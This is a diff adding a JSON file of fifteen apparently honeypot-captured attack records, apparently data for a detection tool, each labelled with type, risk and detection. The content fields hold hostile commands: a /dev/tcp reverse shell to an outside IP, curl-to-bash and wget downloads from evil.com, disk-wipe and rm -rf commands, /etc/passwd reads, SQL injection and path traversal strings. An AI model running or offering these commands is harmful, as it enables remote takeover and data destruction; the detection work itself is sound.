@@ -1,0 +1,167 @@
+[
+  {
+    "payload_id": "pl-001",
+    "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "timestamp": "2026-09-20T14:23:45Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "SSH",
+    "type": "reverse_shell",
+    "content": "bash -i >& /dev/tcp/185.220.101.34/4444 0>&1",
+    "risk": "CRITICAL",
+    "detection": "Netcat-style reverse shell pattern"
+  },
+  {
+    "payload_id": "pl-002",
+    "session_id": "b2c3d4e5-f6a7-8901-bcde-f12345678901",
+    "timestamp": "2026-09-20T14:25:45Z",
+    "source_ip": "10.0.0.55",
+    "protocol": "SSH",
+    "type": "download_execute",
+    "content": "curl http://evil.com/malware.sh | bash",
+    "risk": "CRITICAL",
+    "detection": "Remote code execution via curl pipe"
+  },
+  {
+    "payload_id": "pl-003",
+    "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "timestamp": "2026-09-20T14:23:30Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "SSH",
+    "type": "reconnaissance",
+    "content": "cat /etc/passwd",
+    "risk": "HIGH",
+    "detection": "Credential harvesting attempt"
+  },
+  {
+    "payload_id": "pl-004",
+    "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "timestamp": "2026-09-20T14:23:35Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "SSH",
+    "type": "reconnaissance",
+    "content": "wget http://evil.com/malware.sh",
+    "risk": "CRITICAL",
+    "detection": "Malware download from known malicious domain"
+  },
+  {
+    "payload_id": "pl-005",
+    "session_id": "e5f6a7b8-c9d0-1234-efab-345678901234",
+    "timestamp": "2026-09-20T15:05:22Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "HTTP",
+    "type": "sql_injection",
+    "content": "union select 1,2,3,4,5--",
+    "risk": "HIGH",
+    "detection": "SQL injection payload in User-Agent"
+  },
+  {
+    "payload_id": "pl-006",
+    "session_id": "e5f6a7b8-c9d0-1234-efab-345678901234",
+    "timestamp": "2026-09-20T15:05:25Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "HTTP",
+    "type": "path_traversal",
+    "content": "../../../../etc/passwd",
+    "risk": "HIGH",
+    "detection": "Directory traversal attempt"
+  },
+  {
+    "payload_id": "pl-007",
+    "session_id": "b8c9d0e1-f2a3-4567-bcde-678901234567",
+    "timestamp": "2026-09-20T15:20:12Z",
+    "source_ip": "89.248.167.131",
+    "protocol": "HTTP",
+    "type": "scanner",
+    "content": "GET /cgi-bin/test-cgi HTTP/1.1",
+    "risk": "MEDIUM",
+    "detection": "Nikto CGI scanner probe"
+  },
+  {
+    "payload_id": "pl-008",
+    "session_id": "b8c9d0e1-f2a3-4567-bcde-678901234567",
+    "timestamp": "2026-09-20T15:20:15Z",
+    "source_ip": "89.248.167.131",
+    "protocol": "HTTP",
+    "type": "scanner",
+    "content": "GET /admin/config.php HTTP/1.1",
+    "risk": "MEDIUM",
+    "detection": "Nikto admin panel scan"
+  },
+  {
+    "payload_id": "pl-009",
+    "session_id": "d0e1f2a3-b4c5-6789-defa-890123456789",
+    "timestamp": "2026-09-20T15:30:05Z",
+    "source_ip": "23.129.64.130",
+    "protocol": "HTTP",
+    "type": "scanner",
+    "content": "GET /vulnerabilities/exec HTTP/1.1",
+    "risk": "MEDIUM",
+    "detection": "Nmap NSE vulnerability scanner"
+  },
+  {
+    "payload_id": "pl-010",
+    "session_id": "a9b0c1d2-e3f4-5678-abcd-789abcdef012",
+    "timestamp": "2026-09-20T16:15:02Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "SSH",
+    "type": "destructive",
+    "content": "dd if=/dev/zero of=/dev/sda",
+    "risk": "CRITICAL",
+    "detection": "Disk wipe attempt"
+  },
+  {
+    "payload_id": "pl-011",
+    "session_id": "a9b0c1d2-e3f4-5678-abcd-789abcdef012",
+    "timestamp": "2026-09-20T16:15:05Z",
+    "source_ip": "192.168.1.105",
+    "protocol": "SSH",
+    "type": "destructive",
+    "content": "rm -rf / --no-preserve-root",
+    "risk": "CRITICAL",
+    "detection": "Recursive filesystem deletion"
+  },
+  {
+    "payload_id": "pl-012",
+    "session_id": "b4c5d6e7-f8a9-0123-bcde-23456789abcd",
+    "timestamp": "2026-09-20T15:50:07Z",
+    "source_ip": "10.0.0.55",
+    "protocol": "SSH",
+    "type": "c2_beacon",
+    "content": "wget http://185.220.101.34/payload.sh",
+    "risk": "CRITICAL",
+    "detection": "C2 beacon to known malicious IP"
+  },
+  {
+    "payload_id": "pl-013",
+    "session_id": "b4c5d6e7-f8a9-0123-bcde-23456789abcd",
+    "timestamp": "2026-09-20T15:50:10Z",
+    "source_ip": "10.0.0.55",
+    "protocol": "SSH",
+    "type": "persistence",
+    "content": "crontab -e",
+    "risk": "HIGH",
+    "detection": "Cron job persistence setup"
+  },
+  {
+    "payload_id": "pl-014",
+    "session_id": "c1d2e3f4-a5b6-7890-cdef-9abcdef01234",
+    "timestamp": "2026-09-20T16:25:55Z",
+    "source_ip": "45.33.32.156",
+    "protocol": "HTTP",
+    "type": "reconnaissance",
+    "content": "GET /robots.txt HTTP/1.1",
+    "risk": "LOW",
+    "detection": "Standard robots.txt probe"
+  },
+  {
+    "payload_id": "pl-015",
+    "session_id": "d2e3f4a5-b6c7-8901-defa-abcdef012345",
+    "timestamp": "2026-09-20T16:30:41Z",
+    "source_ip": "185.220.101.34",
+    "protocol": "HTTP",
+    "type": "header_manipulation",
+    "content": "X-Forwarded-For: 127.0.0.1",
+    "risk": "MEDIUM",
+    "detection": "IP spoofing via X-Forwarded-For header"
+  }
+]
